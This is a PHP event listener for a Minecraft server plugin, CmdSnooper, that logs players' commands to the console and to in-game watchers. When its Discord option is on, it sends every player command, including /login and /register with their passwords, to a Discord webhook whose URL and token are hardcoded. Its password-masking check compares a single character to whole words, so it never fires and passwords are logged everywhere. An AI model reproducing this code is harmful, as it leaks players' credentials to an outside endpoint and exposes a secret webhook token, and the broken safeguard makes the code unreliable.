<?php

namespace cmdsnooper;

use pocketmine\event\Listener;
use pocketmine\event\server\CommandEvent;
use cmdsnooper\CmdSnooper;
use pocketmine\player\Player;

use CortexPE\DiscordWebhookAPI\Message;
use CortexPE\DiscordWebhookAPI\Webhook;
use CortexPE\DiscordWebhookAPI\Embed;

class EventListener implements Listener {
	public $plugin;
	public function __construct(CmdSnooper $plugin) {
		$this->plugin = $plugin;
	}

	public function getPlugin() {
		return $this->plugin;
	}
	
	public function onCmnd(CommandEvent $event): void{
	  $sender = $event->getSender();
		$msg = $event->getCommand();
		if($this->getPlugin()->setting->get("Discord") == "true"){
		  if($sender instanceof Player){
		   $discord = new Webhook("https://discord.com/api/webhooks/1159487002174046248/OnT56YIxLOTUKak1ZkbTvsHxjdZFHW1PAii6t17b9qBlwAeX2Jh62w6IWQqibJYXIBrF");
		   $message = new Message();
		   $message->setContent("Player ".$sender->getName() . " -> /".$msg);
		   $discord->send($message);
		  }
		}
		if($this->getPlugin()->setting->get("Console.Logger") == "true") {
		  if($sender instanceof Player){
		   if($msg[0] == "login" or $msg[0] == "log" or $msg[0] == "register" or $msg[0] == "reg"){
		     $this->getPlugin()->getLogger()->info($sender->getName() . "§a Covered for security reasons!");
		     return;
		   }
		   $this->getPlugin()->getLogger()->info("§f§l[§cSpy§f]§r§a ". $sender->getName() . " §e➼§a /" . $msg);
		   }
	  	}
			
			if(!empty($this->getPlugin()->snoopers)) {
				foreach($this->getPlugin()->snoopers as $snooper) {
			    if($sender instanceof Player){
			      if($msg[0] == "login" or $msg[0] == "log" or $msg[0] == "register" or $msg[0] == "reg"){
		           $this->getPlugin()->getLogger()->info($sender->getName() . "§a Covered for security reasons!");
		           return;
		         }
						 $snooper->sendMessage("§f§l[§cSpy§f]§r§a " . $sender->getName() . " §e➼§a /" . $msg);
				  }
				}
	    }		
    }
  }